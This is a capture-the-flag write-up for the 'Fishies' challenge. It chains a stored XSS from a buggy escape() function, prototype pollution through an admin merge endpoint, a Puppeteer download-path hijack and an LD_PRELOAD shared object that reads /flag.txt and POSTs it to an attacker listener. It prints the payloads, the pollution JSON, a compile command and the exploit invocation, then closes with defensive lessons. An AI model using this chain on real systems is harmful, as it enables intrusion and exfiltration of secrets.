# Fishies: stored XSS, prototype pollution, Chromium downloads and LD_PRELOAD

[По-русски](solve.ru.md)

## 0. The complete chain

The user can create a fish with an ASCII picture and submit it for review. A privileged Puppeteer bot visits reported fish. The flag is stored in `/flag.txt` on the server, not returned by any ordinary API.

The working four-visit chain was:

```text
ASCII rendering bug -> stored XSS in the review bot
  -> authenticated admin PATCH -> prototype pollution
  -> inherited Puppeteer downloadBehavior
  -> download payload.so into Express static directory
  -> another pollution of env.LD_PRELOAD
  -> next Chromium launch loads payload.so
  -> constructor reads /flag.txt and writes a static copy
  -> GET /static/dl/flag.txt
```

This is no longer an inferred chain: an original CTF exploit, the C source of the shared object, an independently preserved local Puppeteer audit, and a masked successful run are now published under `scripts/` and `evidence/`. The original task archive also contains `server.js` and its HTML template. The final live result is distinct from an earlier Git-dialog attempt that failed when the CTF network was unreachable.

## 1. Find the first bug: how escape() skips a character

The renderer calls a custom `escape()` function before putting user-controlled `ascii` into a `<pre>` element. The function mutates the string and advances its index after replacing a `<` or `>` with an entity.

The key error is that the replacement-length adjustment and the loop's normal increment combine to **skip the character immediately following a replacement**. Supplying adjacent angle brackets allows the second one to remain unescaped. The preserved test was:

```text
POST /api/fish
{"ascii":"><img src=x onerror=\"window.__probe=1\">","fishData":{}}
-> 200 {"id":5}
```

The subsequent page contained:

```html
<pre class="fish-detail__ascii">&gt;<img src=x onerror="window.__probe=1"&gt;</pre>
```

The initial `>` becomes `&gt;`, but the following literal `<img` begins an actual HTML element. Its invalid `src=x` triggers `onerror`.

The important distinction: an HTML-escaping operation can look present in source and still be unsafe if a mutable-string parser skips bytes. The exploit does not require turning off a general-purpose template escape.

## 2. Why the admin bot matters

The public endpoint `POST /api/fish/:id/report` queues a review. `visitFish` starts a headless Puppeteer browser, sets an HttpOnly admin cookie and opens the reported fish. JavaScript from the injected `onerror` handler runs **inside that authenticated browser session**.

An earlier live check put a simple `fetch()` in the handler; the attacker's listener received its request. The preserved masked run also shows:

```text
POST /api/fish/6/report -> 200 "review queued"
attacker HTTP listener received GET /ping_channel
```

This proves that the bot executes injected JavaScript and can make outbound requests. It does not give direct access to the HttpOnly cookie, which is not needed.

## 3. Admin PATCH becomes global prototype pollution

The application exposes an admin-only endpoint:

```text
PATCH /api/admin/fish/:id/fishData
Content-Type: application/json
```

The handler recursively combines attacker-supplied JSON with an existing fish's `fishData`. The merge function `combine(target,source)` does not reject the property name `__proto__`. When the source is parsed from JSON, `__proto__` is an own property, and recursion can follow the inherited object into `Object.prototype`.

That turns the bot's admin privilege into a process-wide data-integrity error. Other code in the same Node.js process may now read inherited properties that it never set itself.

One staged JSON structure was:

```json
{
  "__proto__": {
    "downloadBehavior": {
      "policy": "allow",
      "downloadPath": "/app/static/dl"
    },
    "env": {
      "PATH": "/usr/local/bin:/usr/bin:/bin",
      "HOME": "/app/static/dl"
    }
  }
}
```

A JavaScript pitfall from the original investigation: `{__proto__: {...}}` as an **object literal** changes that object's prototype, so `JSON.stringify` may omit the intended own `__proto__` key. The recovered `exploit.py` correctly generates an actual JSON string with that key.

Another pitfall: the payload is inside an HTML attribute delimited by double quotes, so JavaScript double quotes must be encoded as `&quot;`, or the browser closes the attribute too soon.

## 4. Why Puppeteer reads the polluted properties

The challenge used **Puppeteer 25.16.0** and launched Chromium with an options object specifying `headless`, `args` and `timeout`, but **not** own `downloadBehavior` or `env` members.

The separate audit traces these values through the compiled browser-launcher code. In particular, `BrowserLauncher` destructures `downloadBehavior` and `env` from the options object; JavaScript property access includes inherited values. Browser setup forwards `downloadBehavior` to:

```text
Browser.setDownloadBehavior(
    behavior = "allow",
    downloadPath = "/app/static/dl"
)
```

The local audit checked four variations: `HOME` only, `HOME` plus `downloadBehavior`, `downloadBehavior` without `HOME`, and a nonexistent nested download directory. The relevant results were that **the inherited download path was respected**, and Chromium created the missing directory when needed.

This supplies a file-writing primitive even though the web application's public upload endpoints do not provide arbitrary file writes.

## 5. Visit 1 and visit 2: get a shared object onto disk

The first malicious fish patches `Object.prototype.downloadBehavior` and arranges a programmatic browser download from an attacker-controlled HTTP server, usually on port 8000.

This requires **two reviews**, not one:

1. The first report executes XSS and writes the polluted options. Those new options cannot retroactively change the already launched browser.
2. The second report starts a fresh Chromium process with the polluted options. The browser's download policy now points at `/app/static/dl`; the malicious page downloads `payload.so` there.

The file is reachable through Express static hosting:

```text
GET /static/dl/payload.so -> HTTP 200
recorded size: 15,728 bytes
```

This is an important, independent checkpoint. If this GET is not 200, attempting `LD_PRELOAD` next is premature; the library may never have been written.

With download policy `allow`, Chromium uses the basename from the URL, so `http://<listener>:8000/payload.so` yields the expected filename `payload.so`.

## 6. Visit 3 and visit 4: load the library at browser startup

A second malicious fish patches:

```json
{"__proto__":{"env":{"LD_PRELOAD":"/app/static/dl/payload.so"}}}
```

Again the first report changes settings **for the next browser**. The fourth visit starts a new Chromium process with `LD_PRELOAD` in its environment.

The Puppeteer audit established another subtlety: the inherited `env` value is treated as the **full** environment passed to the child process, not merged with `process.env`. In practice a safe payload should explicitly include essential variables such as `PATH`. The original local tests verified that Chromium inherited the controlled environment.

The published [scripts/pwn.c](scripts/pwn.c) defines an ELF constructor:

```c
__attribute__((constructor)) static void run(void) {
    /* open FLAG_PATH, read bytes, write a static copy and POST to listener */
}
```

A constructor runs as the library is loaded, without needing an exported function call. It reads `/flag.txt`, writes a second copy as `/app/static/dl/flag.txt`, and attempts a separate HTTP POST to the operator's listener. The exact C source is included; no hidden binary blob is required.

Compile for the local lab/listener:

```bash
gcc -shared -fPIC -O2 \
  -DLHOST='"127.0.0.1"' -DLPORT=4466 \
  -o payload.so scripts/pwn.c
```

For a remote lab, substitute the reachable address for `LHOST`, or let `exploit.py` compile with its supplied `--lhost`.

## 7. Recorded live result and verification

The preserved live run records four successful report requests and these independent checks:

```text
report visit 1 -> 200 "review queued"
report visit 2 -> 200 "review queued"
GET /static/dl/payload.so -> 200 (15,728 bytes)
report visit 3 -> 200 "review queued"
report visit 4 -> 200 "review queued"
listener received POST /flag with PP{MASK}
GET /static/dl/flag.txt -> 200, PP{MASK}
```

The separately preserved `solve_2.txt` contains the final flag being checked against the static file endpoint. The score platform accepted the flag. The public repository masks the actual string.

An earlier Git-dialog report ended with “no flag” because its VPN path was down. That was a **different attempt and execution environment**. The later retained result proves success on the live CTF instance, and the original script now shows how the complete chain was performed.

## 8. Original exploit and reproducibility

The actual original Python orchestration is included:

```bash
python3 scripts/exploit.py \
  --host http://<host> \
  --lhost <reachable-listener-ip> \
  --lport 4466 \
  --http-port 8000
```

It builds `payload.so`, creates both fish entries, performs four reviews with waits for the bot, checks static access to the library and then checks the copied flag file. It assumes a separately started HTTP server for the shared object and a listener for the POST fallback; it **does not start those processes itself**, and prints the requirement. `--setup-only` prints the generated payloads for inspection.

The source includes defaults for the static directory and victim fish identifier. Read [evidence/notes.md](evidence/notes.md) for the HTML and JavaScript quoting traps, [evidence/audit-puppeteer-pp.md](evidence/audit-puppeteer-pp.md) for the local browser-option experiments, and [evidence/run-log.txt](evidence/run-log.txt) for the masked successful transcript.

## 9. Dead ends and fixes

- The HttpOnly cookie could not be read, but it did not need to be: XSS performed admin actions in the bot's authenticated context.
- Prototype pollution alone did not execute code. The missing link was `downloadBehavior`, which gave a reliable way to place a file on disk.
- A Handlebars gadget was investigated but unnecessary for the working route.
- Trying the browser-launch environment change in the same review failed conceptually: launch already happened. Each option needs a new browser launch.
- Failing to include the correct `PATH` when replacing `env` can break Chromium startup.
- Incorrectly nesting `__proto__` as a JavaScript literal can silently remove the intended JSON key.
- Cross-origin download naming matters; the filename from the URL was used to make the `LD_PRELOAD` path predictable.

## 10. Security lessons

Use a tested, context-aware HTML encoder; don't edit and rescan an untrusted HTML string with unsafe index logic. Reject the keys `__proto__`, `constructor` and `prototype` during deep merges, or merge into null-prototype dictionaries. Pin and harden the automation environment, validate browser launch options as own properties, and isolate privileged review bots from process-level secrets and writable application static directories.

## Repository evidence

Source code and redacted supporting artifacts: [`assets/server.js`](assets/server.js), [`assets/index.html`](assets/index.html), [`assets/package.json`](assets/package.json).
